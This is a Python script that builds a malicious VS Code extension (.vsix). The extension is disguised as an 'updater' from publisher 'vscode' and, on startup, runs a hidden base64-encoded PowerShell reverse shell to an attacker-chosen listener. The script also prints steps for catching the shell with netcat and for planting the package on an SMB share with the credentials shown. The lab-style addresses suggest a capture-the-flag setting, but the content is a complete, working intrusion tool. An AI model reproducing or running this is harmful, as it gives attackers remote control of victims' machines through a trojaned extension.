#!/usr/bin/env python3
"""
vsix_revshell.py — build a VS Code .vsix that pops a reverse shell on activation.

Usage:
    python3 vsix_revshell.py                       # prompts for IP/port
    python3 vsix_revshell.py -i 10.10.14.3 -p 443  # non-interactive
    python3 vsix_revshell.py -i 10.10.14.3 -p 443 --name updater --engine 1.118.0
"""

import argparse
import base64
import os
import sys
import zipfile


def build_powershell_b64(ip: str, port: int) -> str:
    # Classic PS reverse shell, encoded UTF-16LE -> base64 for powershell -e
    ps = (
        f'$c=New-Object System.Net.Sockets.TCPClient("{ip}",{port});'
        '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};'
        'while(($i=$s.Read($b,0,$b.Length)) -ne 0){'
        '$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
        '$r=(iex $d 2>&1 | Out-String);'
        '$sb=([text.encoding]::ASCII).GetBytes($r+"PS "+(pwd).Path+"> ");'
        '$s.Write($sb,0,$sb.Length);$s.Flush()}'
    )
    return base64.b64encode(ps.encode("utf-16-le")).decode()


def files_for_vsix(name: str, publisher: str, version: str, engine: str, ps_b64: str):
    package_json = f"""{{
  "name": "{name}",
  "displayName": "{name}",
  "publisher": "{publisher}",
  "version": "{version}",
  "engines": {{ "vscode": "^{engine}" }},
  "main": "./extension.js",
  "activationEvents": ["onStartupFinished"],
  "contributes": {{}}
}}"""

    extension_js = (
        "const cp = require('child_process');\n"
        "function activate(context){\n"
        f"    cp.exec('powershell -nop -w hidden -e {ps_b64}');\n"
        "}\n"
        "function deactivate(){}\n"
        "module.exports = { activate, deactivate };\n"
    )

    vsixmanifest = f"""<?xml version="1.0" encoding="utf-8"?>
<PackageManifest Version="2.0.0" xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011">
  <Metadata>
    <Identity Language="en-US" Id="{name}" Version="{version}" Publisher="{publisher}"/>
    <DisplayName>{name}</DisplayName>
    <Description>helper</Description>
  </Metadata>
  <Installation>
    <InstallationTarget Id="Microsoft.VisualStudio.Code"/>
  </Installation>
  <Assets>
    <Asset Type="Microsoft.VisualStudio.Code.Manifest" Path="extension/package.json" Addressable="true"/>
  </Assets>
</PackageManifest>"""

    content_types = """<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="json" ContentType="application/json"/>
  <Default Extension="js" ContentType="application/javascript"/>
  <Default Extension="vsixmanifest" ContentType="text/xml"/>
</Types>"""

    # arcname -> content
    return {
        "extension.vsixmanifest": vsixmanifest,
        "[Content_Types].xml": content_types,
        "extension/package.json": package_json,
        "extension/extension.js": extension_js,
    }


def main():
    ap = argparse.ArgumentParser(description="Build a reverse-shell .vsix")
    ap.add_argument("-i", "--ip", help="listener IP (your tun0)")
    ap.add_argument("-p", "--port", type=int, help="listener port")
    ap.add_argument("--name", default="updater", help="extension name (default: updater)")
    ap.add_argument("--publisher", default="vscode", help="publisher (default: vscode)")
    ap.add_argument("--version", default="1.0.0", help="extension version")
    ap.add_argument("--engine", default="1.118.0",
                    help="target vscode engine, match the share (default: 1.118.0)")
    ap.add_argument("-o", "--out", help="output .vsix path (default: <name>.vsix)")
    args = ap.parse_args()

    ip = args.ip or input("Listener IP (tun0): ").strip()
    port = args.port or int(input("Listener port: ").strip())
    out = args.out or f"{args.name}.vsix"

    ps_b64 = build_powershell_b64(ip, port)
    members = files_for_vsix(args.name, args.publisher, args.version, args.engine, ps_b64)

    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
        for arcname, content in members.items():
            z.writestr(arcname, content)

    print(f"[+] Built {out}")
    print(f"[+] Payload: powershell reverse shell -> {ip}:{port}")
    print(f"[+] Engine:  ^{args.engine}")
    print()
    print("Next steps:")
    print(f"  1. Start a listener:   rlwrap nc -lvnp {port}")
    print(f"  2. Upload to smb:  smbclient //10.129.1.63/<share> "
          f"-U example.htb/mark.nutt%'password1!' -c 'put {out}'")
    print("  3. Wait for the extension host to load it and catch the shell.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(1)
